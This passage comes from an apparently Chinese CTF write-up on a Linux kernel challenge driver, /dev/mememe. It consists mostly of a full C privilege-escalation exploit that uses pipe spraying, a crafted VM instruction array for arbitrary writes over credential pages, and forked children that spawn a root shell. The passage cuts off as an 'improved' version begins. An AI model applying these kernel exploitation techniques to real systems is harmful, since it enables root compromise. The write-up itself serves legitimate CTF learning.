class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  check(write(fd, overread, <span class="keyword">sizeof</span>(overread)));</span><br><span class="line">  check(ioctl(fd, <span class="number">0x7601</span>));</span><br><span class="line">  check(read(fd, dev_recv, <span class="number">0x4</span>));</span><br><span class="line">  dump_hex(dev_recv, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span> victim = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dev_recv[<span class="number">2</span>] == <span class="string">&#x27;p&#x27;</span> &amp;&amp; dev_recv[<span class="number">3</span>] == <span class="string">&#x27;e&#x27;</span>) &#123;</span><br><span class="line">    victim = (<span class="type">uint8_t</span>)dev_recv[<span class="number">0</span>];</span><br><span class="line">    success(<span class="string">&quot;find victim pipe: No.%hhu!\n&quot;</span>, victim);</span><br><span class="line">    <span class="keyword">goto</span> FOUND;</span><br><span class="line">  &#125;</span><br><span class="line">  err_exit(<span class="string">&quot;victim not found&quot;</span>);</span><br><span class="line"></span><br><span class="line">FOUND:</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>此时仅free了<strong>物理相邻的（即可被越界写）的</strong>page，之后再次堆喷<code>cred_jar</code>然后fork提权函数，有很大概率会取走该页面，理论上成功率会高得多</p>
<blockquote>
<p>本地测试成功率都差不多很高，不知道远程怎么样</p>
</blockquote>
<p><img src="/images/2025jqctf-mem/win2.jpg" alt=":)"></p>
<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><h3 id="赛时Exp"><a href="#赛时Exp" class="headerlink" title="赛时Exp"></a>赛时Exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="comment">// #include &quot;./bpf_insn.h&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./klog.h&quot;</span></span></span><br><span class="line"><span class="comment">// #include &quot;./kpwn.h&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;keyutils.h&gt;</span></span><br><span class="line"><span class="comment">// #include &lt;linux/if_packet.h&gt;</span></span><br><span class="line"><span class="comment">// #include &lt;linux/userfaultfd.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span> <span class="comment">// 添加 if_nametoindex 函数的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;threads.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC 0x200005401</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS GREEN <span class="string">&quot;SUCCESS&quot;</span> END</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell_noerr</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    success(<span class="string">&quot;[=============================================]\n&quot;</span>);</span><br><span class="line">    success(<span class="string">&quot;[===================&quot;</span> SUCCESS <span class="string">&quot;===================]\n&quot;</span>);</span><br><span class="line">    success(<span class="string">&quot;[=============================================]\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">  <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">  CPU_ZERO(&amp;cpu_set);</span><br><span class="line">  CPU_SET(core, &amp;cpu_set);</span><br><span class="line">  sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> page_size;</span><br><span class="line"><span class="type">void</span> __attribute__((constructor)) init() &#123;</span><br><span class="line">  bind_cpu(<span class="number">0</span>);</span><br><span class="line">  page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">  info(<span class="string">&quot;page size: %#lx\n&quot;</span>, page_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *device = <span class="string">&quot;/dev/mememe&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rsp &gt; 0 || rsp &lt; 30</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* id</span></span><br><span class="line"><span class="comment"> * imm = id + 2</span></span><br><span class="line"><span class="comment"> * 14:</span></span><br><span class="line"><span class="comment"> *  xchg stack[rsp], stack[rsp-1]</span></span><br><span class="line"><span class="comment"> * 15:</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 16:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] &lt;&lt; stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 17:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] &gt;&gt; stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 18:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] &amp; stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 0x13:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] | stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 0x14:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] == stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 0x15:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] != stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 0x16:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] &lt; stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 0x17:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] &gt; stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 13:</span></span><br><span class="line"><span class="comment"> *  stack[rsp + 1] = stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp++</span></span><br><span class="line"><span class="comment"> * 12:</span></span><br><span class="line"><span class="comment"> *  page[imm] = stack[rsp] // ??? AAW</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 11:</span></span><br><span class="line"><span class="comment"> *  stack[rsp + 1] = page[imm]</span></span><br><span class="line"><span class="comment"> *  rsp++</span></span><br><span class="line"><span class="comment"> * 10:</span></span><br><span class="line"><span class="comment"> *  stack[rsp + 1] = imm</span></span><br><span class="line"><span class="comment"> *  rsp++</span></span><br><span class="line"><span class="comment"> * 8:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] ^ stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 0:</span></span><br><span class="line"><span class="comment"> *  nop</span></span><br><span class="line"><span class="comment"> * 4:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] + stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 5:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] - stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 6:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] * stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> * 7:</span></span><br><span class="line"><span class="comment"> *  stack[rsp - 1] = stack[rsp - 1] / stack[rsp]</span></span><br><span class="line"><span class="comment"> *  rsp--</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  stack[rsp] = 0</span></span><br><span class="line"><span class="comment"> *  rsp &lt;==&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  NEXT:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  v14 = (idx + 2) + page[v14] + 1</span></span><br><span class="line"><span class="comment"> *  idx = (idx + 2) + page[v14]</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  kmap = stack[rsp]</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  00_00_0000_0000</span></span><br><span class="line"><span class="comment"> *  id_nx_imm</span></span><br><span class="line"><span class="comment"> * eg:</span></span><br><span class="line"><span class="comment"> *  11_00_FFFF_FFFF</span></span><br><span class="line"><span class="comment"> * size: 0x6</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">insn</span> &#123;</span></span><br><span class="line">  <span class="type">uint8_t</span> idx;</span><br><span class="line">  <span class="type">uint8_t</span> next;</span><br><span class="line">  <span class="type">uint16_t</span> imm1;</span><br><span class="line">  <span class="type">uint16_t</span> imm2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> Linux Kernel exploit template</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// save_stat();</span></span><br><span class="line">  <span class="comment">//  INFO: Step 0x01: spray pipe</span></span><br><span class="line">  step(<span class="string">&quot;spray pipe&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUMS 0x100</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> pipe_fds[PIPE_NUMS][<span class="number">2</span>];</span><br><span class="line">  <span class="type">char</span> pipe_buf[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="type">char</span> pipe_recv[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUMS; ++i) &#123;</span><br><span class="line">    check(pipe(pipe_fds[i]));</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;find__me&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    check(write(pipe_fds[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray pipe successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    close(pipe_fds[i][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fds[i][<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x02: open device</span></span><br><span class="line">  step(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = check(open(device, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">  success(<span class="string">&quot;device open successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x1008</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">20</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x28</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line"></span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x100c</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">44</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x28</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line"></span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x1010</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">68</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x28</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line"></span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x1014</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">92</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x28</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line"></span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x1018</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">116</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x28</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line"></span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x101c</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">140</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x28</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line"></span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x1020</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">164</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x28</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line"></span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x1024</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">188</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x28</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line"></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x03: open device</span></span><br><span class="line">  step(<span class="string">&quot;close pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; PIPE_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    close(pipe_fds[i][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fds[i][<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x04: fork</span></span><br><span class="line">  step(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; ++i) &#123;</span><br><span class="line">    setuid(<span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        shell_noerr();</span><br><span class="line">        sleep(<span class="number">0x1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;fork\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  write(fd, insns, <span class="keyword">sizeof</span>(insns));</span><br><span class="line">  check(ioctl(fd, <span class="number">0x7601</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    sleep(<span class="number">0x100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="改进Exp"><a href="#改进Exp" class="headerlink" title="改进Exp"></a>改进Exp</h3><blockquote>
<p>仅给出main函数部分</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span 